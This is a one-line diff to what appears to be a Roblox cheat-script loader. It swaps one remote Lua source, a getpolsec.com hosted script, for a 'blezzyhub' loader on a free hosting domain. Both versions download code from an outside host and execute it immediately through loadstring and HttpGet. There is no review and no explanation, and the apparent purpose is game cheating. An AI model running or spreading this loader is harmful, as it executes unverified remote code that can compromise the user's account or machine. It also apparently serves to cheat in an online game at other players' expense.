@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/644c774c0926253fc4708ac10d1977f55077aa3307cc60e55aef8014c97ead73.lua"))()
+loadstring(game:HttpGet("https://blezzyhub.great-site.net/loader"))()
